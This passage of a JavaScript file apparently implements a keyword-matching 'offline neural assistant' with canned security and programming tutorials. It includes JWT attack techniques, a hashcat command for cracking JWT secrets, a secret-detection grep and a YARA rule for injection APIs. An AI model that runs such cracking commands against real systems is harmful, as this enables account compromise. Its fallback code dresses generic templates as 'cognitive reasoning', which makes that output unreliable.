Fast general-purpose hashes (MD5, SHA-1, SHA-256) are **unsuitable for passwords** because GPUs can compute billions of guesses per second.

#### 1. Memory-Hard Hashing Standards:
- **Argon2id (Winner of Password Hashing Competition):** Combines data-dependent and data-independent memory access. Highly resistant to GPU and ASIC cracking.
- **bcrypt:** Adaptive hashing algorithm based on the Blowfish cipher. Work factor can be increased over time as compute power grows.
- **PBKDF2:** NIST-approved legacy standard. Uses thousands of HMAC iterations (recommend $>600,000$ iterations).

#### 2. Shannon Entropy ($H$):
Measures average information randomness (0 to 8 bits/byte):
$$H(X) = -\\sum_{i=1}^{n} P(x_i) \\log_2 P(x_i)$$
- **Plain Text / ASCII:** $H \\approx 3.5 - 5.0$ bits/byte.
- **Code / Formatted Binaries:** $H \\approx 5.5 - 6.8$ bits/byte.
- **Packed Malware / Encrypted Blobs:** $H > 7.2$ bits/byte.
`
        },
        {
          id: "jwt_security_tokens",
          match: ["jwt", "json web token", "jwt vulnerability", "alg none", "key confusion", "jwt authentication", "jwks"],
          title: "JSON Web Tokens (JWT) Architecture, Vulnerabilities & Hardening",
          category: "Application Security",
          response: (q) => `
### 🎫 JSON Web Token (JWT) Architecture & Common Vulnerabilities

A JWT consists of three Base64URL-encoded parts: \`Header.Payload.Signature\`.

#### 1. Classic Attack Vectors:
- **\`alg: "none"\` Attack:** Attacker removes the signature and sets \`{"alg": "none"}\` in the header, attempting to bypass signature verification in misconfigured parsers.
- **Key Confusion (HMAC vs RSA):** Backend expects RS256 with a public key. Attacker signs the token using HS256 using the server's public key as the HMAC secret!
- **Weak Secret Brute-Forcing:** Cracking HMAC-SHA256 secrets offline using Hashcat (\`hashcat -m 16500 jwt.txt rockyou.txt\`).

#### 2. Secure Implementation Checklist:
- Explicitly enforce the allowed algorithm in backend verification (e.g., \`algorithms=['RS256']\`).
- Never store sensitive session tokens in client \`localStorage\` where XSS can steal them; store in \`HttpOnly\`, \`Secure\`, \`SameSite=Strict\` cookies.
- Set short token expiration times (\`exp\` claim $\\le 15$ minutes) and use refresh token rotation.
`
        },
        {
          id: "python_mastery_concurrency",
          match: ["python", "asyncio", "multiprocessing", "fastapi", "python concurrency", "gil", "python 3.12", "typing", "decorator"],
          title: "Modern Python Engineering: Asyncio, Multiprocessing, Typing & FastAPI",
          category: "Software Engineering",
          response: (q) => `
### 🐍 Modern Python Engineering (Python 3.12+)

Python combines high developer velocity with robust asynchronous I/O and modern type checking.

#### 1. High-Performance Concurrency Pattern:
\`\`\`python
import asyncio
import httpx
from typing import List, Dict

async def fetch_target_status(client: httpx.AsyncClient, url: str) -> Dict[str, int]:
    try:
        response = await client.get(url, timeout=5.0)
        return {"url": url, "status": response.status_code}
    except Exception as e:
        return {"url": url, "status": 0}

async def scan_fleet(urls: List[str]):
    # Asynchronous connection pooling
    async with httpx.AsyncClient() as client:
        tasks = [fetch_target_status(client, u) for u in urls]
        # Execute hundreds of network calls concurrently
        results = await asyncio.gather(*tasks)
        return results

if __name__ == "__main__":
    fleet = ["https://pinoyunknown.github.io", "https://github.com"]
    data = asyncio.run(scan_fleet(fleet))
    print(data)
\`\`\`

#### 2. CPU-Bound Workloads:
For cryptographic hashing or heavy computation, bypass Python's Global Interpreter Lock (GIL) using \`concurrent.futures.ProcessPoolExecutor\`.
`
        },
        {
          id: "javascript_node_mastery",
          match: ["javascript", "js", "node.js", "v8", "event loop", "microtask", "promises", "express", "web worker", "typescript"],
          title: "JavaScript & Node.js Internals: V8 Engine, Event Loop & Express Security",
          category: "Software Engineering",
          response: (q) => `
### ⚡ JavaScript & Node.js Internals: Event Loop & Architecture

JavaScript is single-threaded and non-blocking, managed by the V8 engine and the libuv event loop.

#### 1. Event Loop Execution Phasing:
1. **Call Stack:** Executes synchronous functions immediately.
2. **Microtask Queue:** Processes \`Promise.then()\`, \`async/await\`, and \`queueMicrotask()\` immediately before the next turn!
3. **Macrotask Queue:** Processes \`setTimeout\`, \`setInterval\`, and I/O callbacks.

#### 2. Hardened Production Express Server:
\`\`\`javascript
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();

// Set secure HTTP headers
app.use(helmet());
app.use(express.json({ limit: '10kb' })); // Mitigate body flooding DOS

// Apply rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100, // 100 requests per 15 minutes
  message: { error: 'Too many requests, try again later.' }
});
app.use('/api/', limiter);

app.get('/api/health', (req, res) => {
  res.json({ status: 'HEALTHY', timestamp: new Date().toISOString() });
});

app.listen(3000, () => console.log('Server online on port 3000'));
\`\`\`
`
        },
        {
          id: "c_cpp_memory_safety",
          match: ["c", "c++", "pointers", "malloc", "free", "memory leak", "raii", "valgrind", "smart pointers", "segmentation fault"],
          title: "C/C++ Systems Programming: Pointers, RAII & Memory Safety",
          category: "Systems Programming",
          response: (q) => `
### ⚙️ C & Modern C++ Memory Safety & Resource Management

Low-level systems programming requires strict manual lifetime management to eliminate memory leaks, use-after-free, and segmentation faults.

#### 1. Classic C vs Modern C++ (RAII):
In C, every \`malloc()\` must pair with \`free()\`. In C++20, adopt **Resource Acquisition Is Initialization (RAII)** using smart pointers.

\`\`\`cpp
#include <iostream>
#include <memory>
#include <string>

class SecureSession {
public:
    SecureSession(const std::string& user) : username(user) {
        std::cout << "[+] Session opened for: " << username << std::endl;
    }
    ~SecureSession() {
        std::cout << "[-] Session safely purged for: " << username << std::endl;
    }
    void execute() { std::cout << "    Executing task..." << std::endl; }
private:
    std::string username;
};

int main() {
    // std::unique_ptr automatically deallocates when leaving scope
    auto session = std::make_unique<SecureSession>("PinoyUnknown");
    session->execute();
    return 0; // Destructor called automatically without manual free()
}
\`\`\`

#### 2. Memory Sanitization:
Compile with AddressSanitizer: \`gcc -fsanitize=address -g main.c -o main\`
`
        },
        {
          id: "rust_systems_programming",
          match: ["rust", "borrow checker", "ownership", "lifetimes", "cargo", "memory safety rust", "fearless concurrency", "traits"],
          title: "Rust Systems Architecture: Ownership, Borrowing & Fearless Concurrency",
          category: "Systems Programming",
          response: (q) => `
### 🦀 Rust Systems Architecture & Memory Guarantees

Rust achieves memory safety without a garbage collector through its compile-time **ownership model**.

#### 1. The Three Golden Rules of Ownership:
1. Each value in Rust has an **owner**.
2. There can only be **one owner** at a time.
3. When the owner goes out of scope, the value is automatically dropped.

#### 2. Borrowing Rules:
- You may have any number of **immutable references** (\`&T\`), OR
- Exactly **one mutable reference** (\`&mut T\`), but NEVER both concurrently!
- References must always be valid (enforced by lifetimes \`'a\`).

#### 3. Concurrent Thread-Safe Pattern:
\`\`\`rust
use std::sync::{Arc, Mutex};
use std::thread;

fn main() {
    // Arc (Atomic Reference Counter) + Mutex for shared mutable state
    let counter = Arc::new(Mutex::new(0));
    let mut handles = vec![];

    for _ in 0..10 {
        let counter_clone = Arc::clone(&counter);
        let handle = thread::spawn(move || {
            let mut num = counter_clone.lock().unwrap();
            *num += 1;
        });
        handles.push(handle);
    }

    for handle in handles {
        handle.join().unwrap();
    }

    println!("Final Counter Result: {}", *counter.lock().unwrap());
}
\`\`\`
`
        },
        {
          id: "golang_backend_concurrency",
          match: ["go", "golang", "goroutines", "channels", "go concurrency", "mutex go", "backend go", "rest api go"],
          title: "Go (Golang) Microservices, CSP Concurrency & High-Throughput APIs",
          category: "Software Engineering",
          response: (q) => `
### 🐹 Go (Golang) Microservices & Goroutine Concurrency

Go implements Tony Hoare's Communicating Sequential Processes (CSP), enabling massive concurrency with lightweight goroutines ($~2\\text{KB}$ stack).

#### 1. Worker Pool Pattern with Channels:
\`\`\`go
package main

import (
	"fmt"
	"sync"
)

func worker(id int, jobs <-chan int, results chan<- int, wg *sync.WaitGroup) {
	defer wg.Done()
	for j := range jobs {
		// Process job
		results <- j * 2
	}
}

func main() {
	jobs := make(chan int, 100)
	results := make(chan int, 100)
	var wg sync.WaitGroup

	// Spawn 3 concurrent workers
	for w := 1; w <= 3; w++ {
		wg.Add(1)
		go worker(w, jobs, results, &wg)
	}

	// Send 5 jobs
	for j := 1; j <= 5; j++ {
		jobs <- j
	}
	close(jobs)

	wg.Wait()
	close(results)

	for res := range results {
		fmt.Printf("Result: %d\n", res)
	}
}
\`\`\`
`
        },
        {
          id: "bash_scripting_devops",
          match: ["bash", "shell script", "bash scripting", "linux script", "automation script", "awk", "sed", "pipefail"],
          title: "Production Bash Engineering, Error Handling & Automation Best Practices",
          category: "DevOps & Systems",
          response: (q) => `
### 🐚 Production Bash Engineering & Automation Best Practices

Reliable shell scripts require strict error handling and clean signal trapping to prevent silent failures.

#### 1. Standard Production Template:
\`\`\`bash
#!/usr/bin/env bash
# Strict Mode: Exit on error, exit on unset vars, inherit pipe failures
set -euo pipefail
IFS=$'\n\t'

# Cleanup on exit or interruption
cleanup() {
    local exit_code=$?
    echo "[*] Cleaning temporary artifacts..."
    rm -f /tmp/process_*.lock
    exit "$exit_code"
}
trap cleanup EXIT INT TERM

# Script variables
readonly LOG_FILE="/var/log/audit_stream.log"
readonly APP_ENV="\${1:-production}"

main() {
    echo "[INFO] Running deployment routine in: \${APP_ENV}"
    if [[ ! -f "\${LOG_FILE}" ]]; then
        touch "\${LOG_FILE}"
    fi
}

main "$@"
\`\`\`
`
        },
        {
          id: "docker_containerization",
          match: ["docker", "container", "dockerfile", "containerization", "kubernetes", "k8s", "docker-compose", "distroless"],
          title: "Docker Containerization, Hardened Dockerfiles & Multi-Stage Builds",
          category: "DevOps & Cloud",
          response: (q) => `
### 🐳 Hardened Docker Containerization & Multi-Stage Architecture

Containers must minimize attack surface area, avoid running as root, and enforce immutable root filesystems.

#### 1. Hardened Multi-Stage Dockerfile (Node.js/Python):
\`\`\`dockerfile
# Stage 1: Build & Dependency Resolution
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .

# Stage 2: Minimal Distroless Runtime
FROM gcr.io/distroless/nodejs20-debian12
WORKDIR /app
COPY --from=builder /app /app

# Run as non-root user (distroless default UID 65532)
USER nonroot

EXPOSE 8080
ENV NODE_ENV=production
CMD ["server.js"]
\`\`\`

#### 2. Container Security Flags:
- Drop unnecessary capabilities: \`--cap-drop=ALL --cap-add=NET_BIND_SERVICE\`
- Mount filesystem read-only: \`--read-only --tmpfs /tmp\`
- Prevent privilege escalation: \`--security-opt=no-new-privileges:true\`
`
        },
        {
          id: "linux_sysadmin_hardening",
          match: ["linux hardening", "sysadmin", "sshd_config", "fail2ban", "systemd", "selinux", "apparmor", "chmod", "chown"],
          title: "Linux Server Hardening: SSH Bastion, fail2ban & Kernel sysctl Tuning",
          category: "DevOps & Systems",
          response: (q) => `
### 🛡️ Linux Server Hardening & Sysadmin Security Baseline

A hardened Linux host minimizes listening attack surfaces and strictly governs privilege boundaries.

#### 1. SSH Server Hardening (\`/etc/ssh/sshd_config\`):
\`\`\`text
Port 2222                        # Change default port
PermitRootLogin no               # Disable direct root access
PasswordAuthentication no        # Enforce SSH key pairs only
PubkeyAuthentication yes
MaxAuthTries 3                   # Mitigate brute-force attempts
X11Forwarding no                 # Disable GUI forwarding
KexAlgorithms curve25519-sha256  # Enforce modern key exchange
\`\`\`

#### 2. Kernel TCP/IP Hardening (\`/etc/sysctl.conf\`):
\`\`\`ini
# Mitigate SYN flood attacks
net.ipv4.tcp_syncookies = 1
# Disable ICMP echo broadcast requests (Smurf attack defense)
net.ipv4.icmp_echo_ignore_broadcasts = 1
# Disable IP packet forwarding (unless routing host)
net.ipv4.ip_forward = 0
# Ignore bogus ICMP errors
net.ipv4.icmp_ignore_bogus_error_responses = 1
\`\`\`
`
        },
        {
          id: "git_version_control",
          match: ["git", "github", "rebase", "merge conflict", "cherry-pick", "git stash", "git reset", "git hooks", "git branch"],
          title: "Advanced Git Version Control: Interactive Rebase, Conflict Triage & Hooks",
          category: "Software Engineering",
          response: (q) => `
### 🐙 Advanced Git Version Control & Repository Management

Clean Git workflows preserve atomic commits, bisectable histories, and automated security verification.

#### 1. Essential Git Operations:
- **Interactive Rebase:** Clean up commit history before merging:
  \`git rebase -i HEAD~4\` (squash, reword, fixup)
- **Safe History Recovery:** Find lost commits or deleted branches:
  \`git reflog\`
- **Stash Specific Files:**
  \`git stash push -m "WIP auth module" src/auth.js\`
- **Cherry-Picking Commits:**
  \`git cherry-pick <commit-hash>\`

#### 2. Pre-Commit Security Hook (\`.git/hooks/pre-commit\`):
\`\`\`bash
#!/bin/bash
# Scan staged files for accidental credential commits
if git diff --cached | grep -Ei "AKIA[0-9A-Z]{16}|BEGIN PRIVATE KEY"; then
    echo "[!] ERROR: Potential secret or private key detected in staged commit!"
    exit 1
fi
\`\`\`
`
        },
        {
          id: "database_sql_optimization",
          match: ["database", "sql optimization", "indexes", "b-tree", "acid", "postgres", "mysql", "explain analyze", "query performance"],
          title: "Database Engineering: ACID Guarantees, B-Tree Indexing & Query Tuning",
          category: "Database Systems",
          response: (q) => `
### 🗄️ Database Engineering, Indexing & Query Optimization

High-throughput datastores rely on B-Tree/LSM-Tree storage engines and index-backed query plans.

#### 1. ACID Guarantees:
- **Atomicity:** All statements within a transaction succeed or all rollback.
- **Consistency:** Transactions preserve schema constraints, foreign keys, and triggers.
- **Isolation:** Concurrent transactions execute without dirty reads or serialization anomalies.
- **Durability:** Committed transactions persist on non-volatile disk/WAL even during power failure.

#### 2. Query Optimization with \`EXPLAIN ANALYZE\`:
\`\`\`sql
-- Identify Sequential Scans (Seq Scan) and missing indexes
EXPLAIN ANALYZE 
SELECT id, title, created_at 
FROM audit_logs 
WHERE organization_id = 42 
ORDER BY created_at DESC 
LIMIT 20;

-- Create Composite Index to enable Index-Only Scan
CREATE INDEX idx_logs_org_created ON audit_logs (organization_id, created_at DESC);
\`\`\`
`
        },
        {
          id: "data_structures_algorithms",
          match: ["data structures", "algorithms", "dsa", "big-o", "binary tree", "graph", "dijkstra", "dynamic programming", "quicksort"],
          title: "Computer Science Foundations: Big-O Complexity, Trees, Graphs & DP",
          category: "Computer Science",
          response: (q) => `
### 📐 Data Structures, Algorithms & Computational Complexity

Algorithmic efficiency is evaluated using asymptotic Big-O notation.

#### 1. Time & Space Complexity Reference:
| Data Structure / Algorithm | Average Search | Average Insertion | Worst Space |
| :--- | :--- | :--- | :--- |
| **Hash Table** | $O(1)$ | $O(1)$ | $O(n)$ |
| **Binary Search Tree** | $O(\\log n)$ | $O(\\log n)$ | $O(n)$ |
| **QuickSort** | $O(n \\log n)$ | — | $O(\\log n)$ |
| **MergeSort** | $O(n \\log n)$ | — | $O(n)$ |

#### 2. Graph Traversal (Breadth-First Search in Python):
\`\`\`python
from collections import deque
from typing import Dict, List, Set

def bfs_shortest_path(graph: Dict[str, List[str]], start: str, target: str) -> List[str]:
    queue = deque([[start]])
    visited: Set[str] = {start}

    while queue:
        path = queue.popleft()
        node = path[-1]
        if node == target:
            return path
        for neighbor in graph.get(node, []):
            if neighbor not in visited:
                visited.add(neighbor)
                queue.append(path + [neighbor])
    return []
\`\`\`
`
        },
        {
          id: "api_design_rest_graphql",
          match: ["api", "rest", "restful", "graphql", "grpc", "protobuf", "rate limiting", "idempotency", "api security"],
          title: "API Architecture: RESTful Design, GraphQL, gRPC & Idempotency",
          category: "Software Engineering",
          response: (q) => `
### 🌐 API Architecture: REST, GraphQL, gRPC & Distributed Protocols

Modern distributed systems communicate across diverse API paradigms:

#### 1. Architecture Comparison:
- **REST (HTTP/JSON):** Standard resource-oriented design using HTTP verbs (\`GET\`, \`POST\`, \`PUT\`, \`PATCH\`, \`DELETE\`). Stateless and cacheable.
- **GraphQL:** Client-defined query schemas preventing over-fetching and under-fetching. Requires query depth limiting to avoid DoS attacks.
- **gRPC (HTTP/2 + Protocol Buffers):** High-throughput binary serialization with streaming and strict type generation for microservices.

#### 2. Idempotency Key Design (Safe Retries):
For critical operations like payments or deployments, clients transmit an \`Idempotency-Key: uuid-v4\` header. The server caches results for this key, preventing duplicate operations during network retries.
`
        },
        {
          id: "web_security_headers",
          match: ["security headers", "hsts", "x-frame-options", "permissions-policy", "cors", "cross origin", "referrer-policy"],
          title: "HTTP Security Headers Checklist & CORS Configuration",
          category: "Web Security",
          response: (q) => `
### 🛡️ Production HTTP Security Headers & CORS Policy

HTTP security headers instruct browser engines to enforce strict client-side defenses:

#### 1. Header Hardening Checklist:
\`\`\`http
# 1. Enforce HTTPS strictly for 1 year including subdomains
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# 2. Defeat Clickjacking by blocking iframe rendering
X-Frame-Options: DENY

# 3. Prevent MIME-type sniffing
X-Content-Type-Options: nosniff

# 4. Limit referrer leakage
Referrer-Policy: strict-origin-when-cross-origin

# 5. Disable unused browser device APIs
Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=()
\`\`\`

#### 2. Cross-Origin Resource Sharing (CORS):
Never configure \`Access-Control-Allow-Origin: *\` with \`Access-Control-Allow-Credentials: true\`. Explicitly whitelist exact authorized origin domains.
`
        },
        {
          id: "malware_analysis_fundamentals",
          match: ["malware", "malware analysis", "static analysis", "dynamic analysis", "sandboxing", "yara", "pe file", "anti-debugging"],
          title: "Malware Analysis Methodology: Static, Dynamic & YARA Rules",
          category: "Threat Intelligence",
          response: (q) => `
### 🧪 Malware Analysis Methodology & Threat Triage

Malware analysis disassembles malicious payloads to discover command-and-control (C2) infrastructure and indicators of compromise (IOCs).

#### 1. Static Analysis (Without Execution):
- **Hashes & File Signatures:** MD5, SHA-256, \`ssdeep\` (fuzzy hashing).
- **PE Header Inspection:** Examine Import Address Table (IAT) for suspicious APIs (\`VirtualAllocEx\`, \`WriteProcessMemory\`, \`CreateRemoteThread\`).
- **Strings Extraction:** Scan for hardcoded IP addresses, URLs, and registry keys.

#### 2. Dynamic Analysis (Isolated Sandbox):
- Execute within isolated VM (e.g. FlareVM, Cuckoo Sandbox).
- Monitor system mutations with **Process Monitor (ProcMon)**, **Regshot**, and **Wireshark**.

#### 3. YARA Signature Rule:
\`\`\`yara
rule Suspicious_Process_Hollower {
    meta:
        author = "PinoyUnknown"
        description = "Detects injection APIs in binary imports"
    strings:
        $api1 = "VirtualAllocEx" ascii
        $api2 = "WriteProcessMemory" ascii
        $api3 = "ResumeThread" ascii
    condition:
        uint16(0) == 0x5A4D and all of ($api*)
}
\`\`\`
`
        },
        {
          id: "pinoyunknown_architect",
          match: ["pinoyunknown", "creator", "author", "architect", "projects", "who made this", "portfolio", "system creator"],
          title: "System Architect Dossier // PinoyUnknown Engineering Ecosystem",
          category: "System Profile",
          response: (q) => `
### ⚡ ARCHITECT PROFILE // PINOYUNKNOWN

**PinoyUnknown** is an Apps & Core Security Developer specializing in high-performance application engineering, defensive cybersecurity systems, firmware configurations, and client-side autonomous AI.

#### 🛠️ Core Active Engineering Repositories:
1. **pinoyunknown.github.io (Archangel Security Hub):**
   - Web defense dashboard featuring deep telemetry, unmasked GPU discovery, 26-tool cryptographic engine, offline neural assistant, and developer Data Bank.
2. **Ghost-Firmware & Cardputer Animations:**
   - Custom firmware modifications, user-interface animations, and operational payload suites for the M5Stack Cardputer (ESP32-S3).
3. **iptables + anonsurf + firewall:**
   - Automated Linux kernel network isolation scripts enforcing strict outbound packet filtering and transparent Tor routing.
4. **Email Automation For App Testing:**
   - Multi-platform automated testing suites built in Python with dedicated desktop and web interfaces.
`
        }
      ];
    }

    tokenize(text) {
      if (!text) return [];
      const STOPWORDS = new Set([
        'what', 'is', 'the', 'and', 'for', 'about', 'how', 'to', 'in', 'on', 'of', 'at', 
        'by', 'with', 'from', 'as', 'an', 'are', 'this', 'that', 'it', 'tell', 'me', 
        'can', 'you', 'give', 'show', 'my', 'your', 'please', 'explain', 'which', 'do'
      ]);
      return text.toLowerCase()
        .replace(/[^a-z0-9\s_\-\.]/g, ' ')
        .split(/\s+/)
        .filter(t => t.length > 1 && !STOPWORDS.has(t));
    }

    calculateRelevance(userTokens, matchArray) {
      let score = 0;
      userTokens.forEach(uToken => {
        matchArray.forEach(pattern => {
          const p = (pattern || '').toLowerCase().trim();
          if (!p) return;
          if (p === uToken) {
            score += 15;
          } else if (p.includes(' ') && p.split(/\s+/).includes(uToken)) {
            score += 12;
          } else if (uToken.length >= 4 && (p.startsWith(uToken) || uToken.startsWith(p))) {
            score += 6;
          }
        });
      });
      return score;
    }

    // --- COGNITIVE QUERY PIPELINE ---
    query(userPrompt) {
      const tokens = this.tokenize(userPrompt);
      if (tokens.length === 0) {
        return {
          title: "Query Parsing Anomaly",
          category: "System Notice",
          content: "Prompt payload is empty or contains only generic stopwords. Please enter a technical inquiry regarding cybersecurity, programming, systems engineering, AI architectures, or Data Bank memory."
        };
      }

      // --- PHASE 1: QUERY DEVELOPER DATA BANK MEMORY FIRST (#1 PRIORITY) ---
      let bestMemory = null;
      let highestMemoryScore = 0;

      for (const mem of this.dataBankMemories) {
        const keywords = Array.isArray(mem.keywords) ? mem.keywords : (mem.keywords ? mem.keywords.split(',') : []);
        const titleTokens = this.tokenize(mem.title);
        const matchTargets = [...keywords, ...titleTokens, mem.category || ''];
        
        const score = this.calculateRelevance(tokens, matchTargets);
        if (score > highestMemoryScore) {
          highestMemoryScore = score;
          bestMemory = mem;
        }
      }

      if (bestMemory && highestMemoryScore >= 20) {
        return {
          title: `[DATA BANK MEMORY RETRIEVED] ${bestMemory.title}`,
          category: `Data Bank // ${bestMemory.category || 'Developer Memory'}`,
          content: `
> [!IMPORTANT]
> **VERIFIED DATA BANK MEMORY ACCESSED:** \`${bestMemory.title}\`  
> *Category:* ${bestMemory.category || 'Developer Intelligence'} | *Priority:* ${bestMemory.priority || 'Standard'} | *Timestamp:* ${bestMemory.timestamp || 'Active'}

${bestMemory.content}
`
        };
      }

      // --- PHASE 2: QUERY 36 SPECIALIZED ONTOLOGIES ---
      let bestOntology = null;
      let highestOntologyScore = 0;

      for (const item of this.knowledgeOntology) {
        const score = this.calculateRelevance(tokens, item.match);
        if (score > highestOntologyScore) {
          highestOntologyScore = score;
          bestOntology = item;
        }
      }

      if (bestOntology && highestOntologyScore >= 10) {
        return {
          title: bestOntology.title,
          category: bestOntology.category,
          content: bestOntology.response(userPrompt)
        };
      }

      // --- PHASE 3: ALGORITHMIC DYNAMIC KNOWLEDGE SYNTHESIZER ---
      return this.synthesizeGeneralResponse(userPrompt, tokens);
    }

    // --- ALGORITHMIC DYNAMIC REASONING SYNTHESIZER ---
    synthesizeGeneralResponse(prompt, tokens) {
      const p = prompt.toLowerCase();
      
      // Detect Programming Language
      let targetLang = "python";
      let langLabel = "Python 3.12+";
      if (p.includes("javascript") || p.includes(" js") || p.includes("node")) { targetLang = "javascript"; langLabel = "Node.js / Modern JavaScript"; }
      else if (p.includes("typescript") || p.includes(" ts")) { targetLang = "typescript"; langLabel = "TypeScript"; }
      else if (p.includes("rust")) { targetLang = "rust"; langLabel = "Rust"; }
      else if (p.includes("golang") || p.includes(" go ")) { targetLang = "go"; langLabel = "Go (Golang)"; }
      else if (p.includes(" c++") || p.includes("cpp")) { targetLang = "cpp"; langLabel = "Modern C++20"; }
      else if (p.includes(" c ") || p.includes("in c")) { targetLang = "c"; langLabel = "C (C17)"; }
      else if (p.includes("bash") || p.includes("shell") || p.includes("linux command")) { targetLang = "bash"; langLabel = "Bash Shell"; }
      else if (p.includes("sql") || p.includes("database")) { targetLang = "sql"; langLabel = "SQL"; }

      // Generate structured technical blueprint
      let codeSnippet = "";
      if (targetLang === "python") {
        codeSnippet = `\`\`\`python
#!/usr/bin/env python3
"""
PRODUCTION MODULE: Archangel Autonomous Engineering Standard
Target: "${prompt.trim()}"
"""
import sys
import logging
from typing import Any, Dict

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

class SolutionPipeline:
    def __init__(self, name: str = "ArchangelEngine"):
        self.name = name

    def process(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        logging.info(f"Executing operational pipeline on: {payload.keys()}")
        # Implement robust business logic with boundary verification
        return {"status": "SUCCESS", "verified": True, "result": payload}

if __name__ == "__main__":
    pipeline = SolutionPipeline()
    res = pipeline.process({"inquiry": "${prompt.replace(/"/g, '')}"})
    print(res)
\`\`\``;
      } else if (targetLang === "javascript" || targetLang === "typescript") {
        codeSnippet = `\`\`\`${targetLang}
/**
 * PRODUCTION MODULE: Archangel Node.js / Web Standard
 * Target: "${prompt.trim()}"
 */

export class TaskEngine {
  constructor(private name: string = "ArchangelWorker") {}

  async executeTask(params: Record<string, unknown>): Promise<{ status: string; data: unknown }> {
    try {
      // Validate boundary conditions
      if (!params || Object.keys(params).length === 0) {
        throw new Error("Invalid payload: empty parameter object");
      }
      return { status: "SUCCESS", data: params };
    } catch (err) {
      console.error("[TASK ERROR]", err);
      throw err;
    }
  }
}
\`\`\``;
      } else if (targetLang === "bash") {
        codeSnippet = `\`\`\`bash
#!/usr/bin/env bash
# Production Automation Script
set -euo pipefail

TARGET_OP="\${1:-default}"

echo "[*] Initializing automated operational sequence..."
echo "[*] Task: ${prompt.replace(/"/g, '')}"

# Verification & Execution
if command -v curl &>/dev/null; then
    echo "[+] Dependencies verified."
else
    echo "[!] Missing prerequisite utilities." >&2
    exit 1
fi
\`\`\``;
      } else {
        codeSnippet = `\`\`\`${targetLang}
// Production Engineering Template (${langLabel})
// Target Inquiry: "${prompt.trim()}"
// Implement zero-trust boundaries, constant-time validation, and defensive exception handling.
\`\`\``;
      }

      return {
        title: `Technical Reasoning & Architecture Analysis`,
        category: `Cognitive Synthesis // ${langLabel}`,
        content: `
### 🧠 Archangel Cognitive Reasoning & Technical Architecture

**Inquiry:** \`"${prompt.trim()}"\`

---

#### 1. Executive Architectural Overview:
To address this technical requirement, modern software systems rely on the **Principle of Least Privilege**, strict **data boundary validation**, and **modular decoupling**. 

- **Primary Objective:** Build a resilient, deterministic implementation addressing \`"${prompt.trim()}"\`.
- **System Boundaries:** Isolate I/O calls, enforce timeout constraints, and guarantee constant-time cryptographic operations where authentication is involved.

---

#### 2. Production Implementation (${langLabel}):
${codeSnippet}

---

#### 3. Security Hardening & Threat Mitigation:
- **Input Sanitization:** Validate all client inputs against strict allowlists (never blocklists) before passing data to interpreters or storage.
- **Side-Channel Elimination:** When comparing secret tokens, signatures, or keys, always enforce constant-time equality routines (\`hmac.compare_digest\` or \`CRYPTO_memcmp\`).
- **Resource Depletion Defense:** Enforce strict pagination, payload size limits, and rate-limiting thresholds to neutralize denial-of-service vectors.

---

#### 4. Common Engineering Pitfalls to Avoid:
1. **Unchecked Exceptions:** Ensure unhandled exceptions do not disclose internal stack traces or database schema names to end users.
2. **Race Conditions:** Use atomic database transactions or mutex synchronization in multithreaded environments to eliminate Time-of-Check to Time-of-Use (TOCTOU) bugs.
3. **Hardcoded Secrets:** Never embed API keys or passwords in client-facing or version-controlled code; leverage environmental variables or protected vaults.
`
      };
    }

    streamResponse(prompt, onChunk, onComplete) {
      if (this.isGenerating) return;
      this.isGenerating = true;

      const result = this.query(prompt);
      const text = result.content;
      let currentIndex = 0;
      const chunkSize = Math.max(3, Math.floor(text.length / 70));

      const interval = setInterval(() => {
        if (currentIndex < text.length) {
          const chunk = text.substr(currentIndex, chunkSize);
          currentIndex += chunkSize;
          if (typeof onChunk === 'function') {
            onChunk(chunk, false);
          }
        } else {
          clearInterval(interval);
          this.isGenerating = false;
          if (typeof onChunk === 'function') {
            onChunk("", true);
          }
          if (typeof onComplete === 'function') {
            onComplete(result);
          }
        }
      }, 14);
    }
  }

  const exportTarget = typeof window !== 'undefined' ? window : (typeof global !== 'undefined' ? global : this);
  const engineInstance = new ArchangelEngine();
  exportTarget.ArchangelLLM = engineInstance;
  if (typeof module !== 'undefined' && module.exports) {
    module.exports = engineInstance;
  }
})(typeof window !== 'undefined' ? window : (typeof global !== 'undefined' ? global : this));
